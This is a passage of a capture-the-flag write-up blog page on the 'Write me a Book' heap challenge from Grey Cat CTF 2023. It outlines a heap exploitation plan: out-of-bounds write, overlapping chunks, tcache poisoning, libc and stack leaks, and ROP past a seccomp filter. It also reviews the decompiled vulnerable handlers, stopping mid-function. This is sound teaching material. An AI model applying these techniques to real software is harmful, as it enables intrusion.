<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>[Grey Cat CTF Quals 2023 - pwn] Write me a Book | repr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Write me a book Write me a Book349 Give back to the library! Share your thoughts and experiences! The flag can be found in &#x2F;flag    Elma nc 34.124.157.94 12346   Write me a book is a heap challen">
<meta property="og:type" content="article">
<meta property="og:title" content="[Grey Cat CTF Quals 2023 - pwn] Write me a Book">
<meta property="og:url" content="https://n4sm.github.io/posts/writemeabook/index.html">
<meta property="og:site_name" content="repr">
<meta property="og:description" content="Write me a book Write me a Book349 Give back to the library! Share your thoughts and experiences! The flag can be found in &#x2F;flag    Elma nc 34.124.157.94 12346   Write me a book is a heap challen">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-05-20T22:00:00.000Z">
<meta property="article:modified_time" content="2023-09-05T09:45:11.053Z">
<meta property="article:author" content="nasm">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="nasm">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.0.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/pic/wall.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>repr </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nasm </div>
      <div class="dot"></div>
      <div class="subtitle">pwn / kernel stuff </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box"></div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/posts/hello-world/" title="Hello World" >
            <div class="recent-link-text">
              Hello World
            </div>
          </a>
        
          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] window-of-opportunity
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-writemeabook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        [Grey Cat CTF Quals 2023 - pwn] Write me a Book
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-05-20T22:00:00.000Z" itemprop="datePublished">2023-05-20</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            3k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nasm/" rel="tag">nasm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="Write-me-a-book"><a href="#Write-me-a-book" class="headerlink" title="Write me a book"></a>Write me a book</h1><blockquote>
<p>Write me a Book<br>349</p>
<p>Give back to the library! Share your thoughts and experiences!</p>
<p>The flag can be found in &#x2F;flag</p>
<p>   Elma</p>
<p>nc 34.124.157.94 12346 </p>
</blockquote>
<p>Write me a book is a heap challenge I did during the <a target="_blank" rel="noopener" href="https://nusgreyhats.org/">Grey Cat The Flag 2023 Qualifiers</a>. You can find the tasks and the exploit <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook">here</a>.</p>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>To manage to read the flag we have to:</p>
<ul>
<li>create overlapping chunks due to an oob write vulnerability in <code>rewrite_books</code></li>
<li>tcache poisoning thanks to the overlapping chunks</li>
<li>Overwrite the first entry of <code>@books</code> to then be able to rewrite 4 entries of <code>@books</code> by setting a large size.</li>
<li>With the read &#x2F; write primitives of <code>@books</code> we leak <code>&amp;stdout@glibc</code> and <code>environ</code>, this way getting a libc and stack leak.</li>
<li>This way we can simply ROP over a given stackframe.</li>
</ul>
<h2 id="General-overview"><a href="#General-overview" class="headerlink" title="General overview"></a>General overview</h2><p>Let’s take a look at the protections and the version of the libc:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ./libc.so.6 </span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.</span><br><span class="line">There is NO warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 11.2.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/+bugs&gt;.</span><br><span class="line">$ checksec --file ./libc.so.6 </span><br><span class="line">[*] <span class="string">&#x27;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>So a very recent one with standards protections. Then let’s take a look at the binary:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file chall</span><br><span class="line">[*] <span class="string">&#x27;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/chall&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fd000)</span><br><span class="line">    RUNPATH:  b<span class="string">&#x27;/home/nasm/Documents/pwn/greycat/writemeabook/dist&#x27;</span></span><br><span class="line">$ seccomp-tools dump ./chall</span><br><span class="line">Welcome to the library of hopes and dreams!</span><br><span class="line"></span><br><span class="line">We heard about your journey...</span><br><span class="line">and we want you to share about your experiences!</span><br><span class="line"></span><br><span class="line">What would you like your author signature to be?</span><br><span class="line">&gt; aa</span><br><span class="line"></span><br><span class="line">Great! We would like you to write no more than 10 books :)</span><br><span class="line">Please feel at home.</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  <span class="keyword">if</span> (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>

<p>The binary isn’t PIE based and does have a seccomp that allows only <code>read</code>, <code>write</code>, <code>open</code> and <code>exit</code>. Which will make the exploitation harder (but not that much).</p>
<h2 id="Code-review"><a href="#Code-review" class="headerlink" title="Code review"></a>Code review</h2><p>The <code>main</code> looks like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the library of hopes and dreams!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWe heard about your journey...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;and we want you to share about your experiences!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWhat would you like your author signature to be?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  LODWORD(author_signature) = <span class="string">&#x27; yb&#x27;</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%12s&quot;</span>, (<span class="type">char</span> *)&amp;author_signature + <span class="number">3</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nGreat! We would like you to write no more than 10 books :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please feel at home.&quot;</span>);</span><br><span class="line">  secure_library();</span><br><span class="line">  write_books();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Goodbye!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We have to give a signature (12 bytes max) sorted in <code>author_signatures</code>, then the program is allocating a lot of chunks in <code>secure_library</code>. Finally it calls <code>write_books</code> which contains the main logic:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">write_books</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fav_num; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_menu();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">1337</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !secret_msg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;What is your favourite number? &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;fav_num);</span><br><span class="line">        <span class="keyword">if</span> ( fav_num &gt; <span class="number">0</span> &amp;&amp; fav_num &lt;= <span class="number">10</span> &amp;&amp; slot[<span class="number">2</span> * fav_num - <span class="number">2</span>] )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;You found a secret message: %p\n&quot;</span>, slot[<span class="number">2</span> * fav_num - <span class="number">2</span>]);</span><br><span class="line">        secret_msg = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_19:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">1337</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        throw_book();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        write_book();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        rewrite_book();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>There are basically three handlers:</p>
<ul>
<li><code>1337</code>, we can leak only one time the address of a given allocated chunk.</li>
<li><code>4</code> returns.</li>
<li><code>3</code> free a chunk.</li>
<li><code>1</code> add a book.</li>
<li><code>2</code> edit a book.</li>
</ul>
<p>Let’s take a quick look at each handler, first the free handler:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">throw_book</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nAt which index of the shelf would you like to throw your book?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">10</span> &amp;&amp; slot[<span class="number">2</span> * v1 - <span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(slot[<span class="number">2</span> * --v1]);</span><br><span class="line">    slot[<span class="number">2</span> * v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your book has been thrown!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invaid slot!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It only checks is the entry exists and if the index is in the right range. if it does it frees the entry and zeroes it.</p>
<p>Then, the add handler:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">write_book</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx2; <span class="comment">// ebx</span></span><br><span class="line">  _QWORD *v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nAt which index of the shelf would you like to insert your book?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0</span> || idx &gt; <span class="number">10</span> || slot[<span class="number">2</span> * idx - <span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invaid slot!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    --idx;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write me a book no more than 32 characters long!&quot;</span>);</span><br><span class="line">    size = read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL) + <span class="number">0x10</span>;</span><br><span class="line">    idx2 = idx;</span><br><span class="line">    slot[<span class="number">2</span> * idx2] = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(slot[<span class="number">2</span> * idx], buf, size - <span class="number">0x10</span>);</span><br><span class="line">    v1 = (<span class="type">char</span> *)slot[<span class="number">2</span> * idx] + size - <span class="number">0x10</span>;</span><br><span class="line">    v2 = qword_4040D8;</span><br><span class="line">    *v1 = *(_QWORD *)author_signature;</span><br><span class="line">    v1[<span class="number">1</span>] = v2;</span><br><span class="line">    books[idx].size = size;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your book has been published!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can allocate a chunk between <code>0x10</code> and <code>0x20 + 0x10</code> bytes and after we wrote in it the signature initially choose at the begin of the execution is put right after the end of the input.</p>
<p>Finally comes the handler where lies the vuln, the edit handler:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">rewrite_book</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nAt which index of the shelf would you like to rewrite your book?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">10</span> &amp;&amp; slot[<span class="number">2</span> * idx - <span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    --idx;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write me the new contents of your book that is no longer than what it was before.&quot;</span>);</span><br><span class="line">    v4 = read(<span class="number">0</span>, slot[<span class="number">2</span> * idx], books[idx].size);</span><br><span class="line">    v0 = (__int64 *)((<span class="type">char</span> *)slot[<span class="number">2</span> * idx]-&gt;buf + v4);</span><br><span class="line">    v1 = qword_4040D8;</span><br><span class="line">    *v0 = author_signature;</span><br><span class="line">    v0[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your book has been rewritten!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  